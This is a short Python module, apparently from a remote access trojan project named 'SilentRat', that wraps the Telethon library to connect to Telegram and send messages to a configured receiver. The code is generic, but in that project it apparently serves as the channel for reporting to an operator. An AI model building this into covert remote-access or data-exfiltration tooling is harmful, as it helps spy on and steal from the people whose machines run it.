from telethon import TelegramClient

from ..communication import Communication
from ...config import get_config


class Telegram(Communication):
    client = None

    async def initialize(self):
        self.client = TelegramClient('SilentRat',
                                     get_config().telegram_api_id,
                                     get_config().telegram_api_hash)
        await self.client.connect()

    async def send_message(self, message: str):
        await self.client.send_message(get_config().telegram_receiver_username, message)
